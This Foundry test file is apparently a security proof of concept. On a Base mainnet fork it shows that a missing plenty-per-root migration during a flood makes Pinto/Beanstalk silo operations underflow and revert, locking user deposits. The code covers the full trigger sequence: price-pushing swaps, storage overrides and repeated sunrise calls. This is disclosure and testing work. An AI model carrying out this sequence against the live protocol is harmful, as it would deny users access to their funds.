// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Proof of Concept: Missing PPR Value Migration During Flood
 * @notice This PoC demonstrates a denial of service vulnerability where users cannot
 *         execute silo operations after a flood due to missing plenty-per-root (PPR)
 *         value migration for certain wells.
 *
 * @dev Vulnerability Overview:
 *      When LibFlood#handleRain() processes a flood, it only migrates PPR values for:
 *      - Currently whitelisted wells (via getCurrentlySoppableWellLpTokens())
 *      - Wells with positive deltaB
 *
 *      However, LibFlood#balanceOfPlenty() uses getSoppableWellLpTokens() which includes
 *      de-whitelisted wells. When calculating plenty for these excluded wells:
 *      - s.sys.sop.sops[s.sys.season.lastSop][well] = 0 (never migrated)
 *      - previousPPR = positive value from previous flood
 *      - Calculation: 0.sub(previousPPR) causes arithmetic underflow
 *
 * @dev Impact:
 *      All silo operations using the mowSender modifier will revert, including:
 *      - deposit(), withdrawDeposit(), transferDeposit(), mow()
 *      User funds become locked in the contract.
 */

import "forge-std/Test.sol";
import {SeasonFacet} from "contracts/beanstalk/facets/sun/SeasonFacet.sol";
import {FieldFacet} from "contracts/beanstalk/facets/field/FieldFacet.sol";
import {ClaimFacet} from "contracts/beanstalk/facets/silo/ClaimFacet.sol";
import {SiloFacet} from "contracts/beanstalk/facets/silo/SiloFacet.sol";

import {SeasonGettersFacet} from "contracts/beanstalk/facets/sun/SeasonGettersFacet.sol";

import {LibTransfer} from "contracts/libraries/Token/LibTransfer.sol";

import {IWell} from "contracts/interfaces/basin/IWell.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

event RainStatus(uint256 indexed season, bool raining);
event SeasonOfPlentyField(uint256 toField);

contract PoC is Test {
    address protocol = address(0xD1A0D188E861ed9d15773a2F3574a2e94134bA8f);
    address PINTO = address(0xb170000aeeFa790fa61D6e837d1035906839a3c8);

    address PINTO_cbETH_LP = address(0x3e111115A82dF6190e36ADf0d552880663A4dBF1);
    address PINTO_cbBTC_LP = address(0x3e11226fe3d85142B734ABCe6e58918d5828d1b4);
    address PINTO_USDC_LP = address(0x3e1133aC082716DDC3114bbEFEeD8B1731eA9cb1);

    address cbETH = address(0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22);
    address cbBTC = address(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);
    address USDC = address(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);

    address whale_cbETH = address(0x6969343c4938b4ca79B1237C94f825df23A9905d);
    address whale_cbBTC = address(0x52Aa899454998Be5b000Ad077a46Bbe360F4e497);
    address whale_USDC = address(0x0B0A5886664376F59C351ba3f598C8A8B4D0A6f3);
    address whale_PINTO = address(0xBF1Edd2411B2e49ECA1d76fa4f9380509B9D01D6);

    /**
     * @notice Setup test environment by forking Base mainnet and creating oversaturation conditions
     * @dev This setup manipulates protocol state to trigger the flood mechanism:
     *      1. Pushes PINTO price above peg (P > 1)
     *      2. Reduces pod rate below 3%
     *      3. Sets L2SR above optimal
     *      These conditions will trigger rain (oversaturation) in the next sunrise
     */
    function setUp() public {
        // Fork Base mainnet at a specific block with known state
        vm.createSelectFork(
            "https://base.drpc.org",
            37431726
        );

        /*
        Oversaturation conditions (from LibEvaluate#evaluateBeanstalk):
        https://basescan.org/address/0xB9D1C6e65a8934ec86d70F358028943e63ee0793#code#F94#L85
        (1) P > 1 (Bean price above peg)
        (2) Pod Rate < 3% (low outstanding debt)
        (3) The L2SR is above the optimal L2SR (excess liquidity)
        */

        // CONDITION 1: Push PINTO price above peg by executing large swaps
        // This sells cbETH, cbBTC, and USDC for PINTO across all wells, reducing PINTO supply
        // and increasing its price relative to the peg
        whale_push_beans_price_up();
        vm.warp(block.timestamp + 10 minutes); // Allow time for price oracle to update

        // CONDITION 2: Reduce pod rate below 3% threshold
        // Directly manipulate storage to reduce the pod index (outstanding debt)
        // This simulates a scenario where most pods have been harvested
        bytes32 fieldsBaseSlot = bytes32(uint256(32));
        uint256 activeField = FieldFacet(protocol).activeField();
        bytes32 podsSlot = keccak256(abi.encode(activeField, fieldsBaseSlot));
        uint256 newPods = FieldFacet(protocol).podIndex(activeField) - 41_190_000e6;
        vm.store(protocol, podsSlot, bytes32(newPods));

        // Verify the pod index was reduced correctly
        assertEq(FieldFacet(protocol).podIndex(activeField), newPods);

        // CONDITION 3: Set L2SR above optimal to signal excess liquidity
        // Lower the optimal L2SR to 0.08e18 (current L2SR at this block is ~0.087e18)
        // This makes the current L2SR appear higher than optimal, triggering oversaturation
        bytes32 lpToSupplyRatioOptimalSlot = bytes32(uint256(251));
        uint256 newLpToSupplyRatioOptimal = 0.08e18;
        vm.store(protocol, lpToSupplyRatioOptimalSlot, bytes32(newLpToSupplyRatioOptimal));

        // Verify the optimal L2SR was set correctly
        assertEq(
            SeasonGettersFacet(protocol).getLpToSupplyRatioOptimal(),
            newLpToSupplyRatioOptimal
        );
    }

    /**
     * @notice Test demonstrating denial of service after flood due to missing PPR migration
     * @dev Test Flow:
     *      1. User deposits PINTO into silo (establishes existing deposits)
     *      2. First sunrise() triggers rain (oversaturation detection via LibFlood#handleRain)
     *      3. Second sunrise() triggers flood (Season of Plenty distribution)
     *      4. User attempts to mow (claim grown stalk) which requires PPR calculation
     *      5. Transaction reverts due to arithmetic underflow in LibFlood#balanceOfPlenty
     *
     * @dev Root Cause:
     *      - During flood, LibFlood#handleRain only migrates PPR for currently whitelisted wells
     *      - When calculating plenty, getSoppableWellLpTokens() includes de-whitelisted wells
     *      - For excluded wells: s.sys.sop.sops[lastSop][well] = 0 (never migrated)
     *      - Calculation attempts: 0.sub(previousPPR) causing underflow and revert
     */
    function test_poc() public {
        // STEP 1: Establish a user deposit in the silo
        // This user will later be unable to interact with their deposit after the flood
        vm.startPrank(whale_PINTO);
        IERC20(PINTO).approve(protocol, type(uint256).max);
        SiloFacet(protocol).deposit(PINTO, 100_000e6, LibTransfer.From.EXTERNAL);
        vm.stopPrank();

        // STEP 2: Trigger rain (oversaturation detection)
        // The oversaturation conditions set in setUp() will trigger rain
        // LibFlood#handleRain detects: P > 1, Pod Rate < 3%, L2SR > optimal
        // Rain is initiated via LibFlood#initRainVariables and startRain
        vm.expectEmit(false, true, false, false);
        emit RainStatus(0, true); // Expect rain to start
        SeasonFacet(protocol).sunrise();

        // STEP 3: Reduce season period to speed up testing
        // Normal season period is 3600 seconds (1 hour), reduce to 600 seconds (10 minutes)
        // This allows us to trigger the next season without waiting an hour
        // This would allow us to test the flood mechanism without updating the oracle
        bytes32 seasonPeriodSlot = bytes32(uint256(214));
        require(
            uint256(vm.load(protocol, seasonPeriodSlot)) == 3600,
            "Expected period to be 3600 seconds"
        );
        vm.store(protocol, seasonPeriodSlot, bytes32(uint256(600)));

        // STEP 4: Trigger flood (Season of Plenty distribution)
        // Wait past the reduced season period and call sunrise again
        // This will execute LibFlood#handleRain's flood logic:
        // - Calls getWellsByDeltaB() which only returns currently whitelisted wells
        // - For wells with deltaB > 0, calls sopWell() which calls rewardSop()
        // - rewardSop() migrates PPR: sops[rainStart][well] = sops[lastSop][well] + newRewards
        // - Wells excluded from this process have sops[rainStart][well] = 0
        // - Updates s.sys.season.lastSop = s.sys.season.rainStart
        vm.warp(block.timestamp + 11 minutes);
        vm.expectEmit(false, false, false, false);
        emit SeasonOfPlentyField(0); // Expect flood to field
        SeasonFacet(protocol).sunrise();

        // STEP 5: Attempt to mow, which triggers the vulnerability
        // ClaimFacet#mow calls:
        // → LibSilo#_mow
        // → LibFlood#handleRainAndSops
        // → LibFlood#balanceOfPlenty for each well in getSoppableWellLpTokens()
        //
        // In balanceOfPlenty, for a well with missing PPR migration:
        // - s.sys.sop.sops[s.sys.season.lastSop][well] = 0 (never migrated during flood)
        // - previousPPR = some positive value from account's last SOP
        // - Attempts: uint256 plentyPerRoot = sops[lastSop][well].sub(previousPPR)
        // - Calculation: 0.sub(positiveValue) causes arithmetic underflow
        // - Transaction reverts with panic code 0x11 (arithmetic underflow/overflow)
        vm.expectRevert();
        ClaimFacet(protocol).mow(whale_PINTO, PINTO);

        // Result: User cannot mow, deposit, withdraw, or transfer
        // All silo operations with mowSender modifier are blocked
        // User's deposited funds are effectively locked until contract upgrade
    }

    /**
     * @notice Helper function to push PINTO price above peg by executing large swaps
     * @dev Simulates market conditions where PINTO becomes overvalued:
     *      - Swaps 100 cbETH for PINTO in PINTO_cbETH_LP well
     *      - Swaps 40 cbBTC for PINTO in PINTO_cbBTC_LP well
     *      - Swaps 1,000,000 USDC for PINTO in PINTO_USDC_LP well
     *
     *      These swaps reduce PINTO reserves in all wells, pushing price > 1
     *      This is one of three conditions required for oversaturation
     */
    function whale_push_beans_price_up() internal {
        // Swap 1: 100 cbETH → PINTO
        // This large swap removes PINTO from the cbETH well, increasing PINTO's price
        vm.startPrank(whale_cbETH);
        IERC20(cbETH).approve(PINTO_cbETH_LP, 100 ether);
        IWell(PINTO_cbETH_LP).swapFrom(
            IERC20(cbETH),
            IERC20(PINTO),
            100 ether,
            0, // No minimum output (accept any amount)
            whale_cbETH,
            type(uint256).max // No deadline
        );
        vm.stopPrank();

        // Swap 2: 40 cbBTC → PINTO
        // Similarly reduces PINTO reserves in the cbBTC well
        vm.startPrank(whale_cbBTC);
        IERC20(cbBTC).approve(PINTO_cbBTC_LP, 40e8);
        IWell(PINTO_cbBTC_LP).swapFrom(
            IERC20(cbBTC),
            IERC20(PINTO),
            40e8,
            0,
            whale_cbBTC,
            type(uint256).max
        );
        vm.stopPrank();

        // Swap 3: 1,000,000 USDC → PINTO
        // Largest swap, significantly impacts PINTO price in USDC well
        vm.startPrank(whale_USDC);
        IERC20(USDC).approve(PINTO_USDC_LP, 1_000_000e6);
        IWell(PINTO_USDC_LP).swapFrom(
            IERC20(USDC),
            IERC20(PINTO),
            1_000_000e6,
            0,
            whale_USDC,
            type(uint256).max
        );
        vm.stopPrank();

        // Result: PINTO price across all three wells is now above peg
        // This satisfies the first oversaturation condition (P > 1)
    }
}
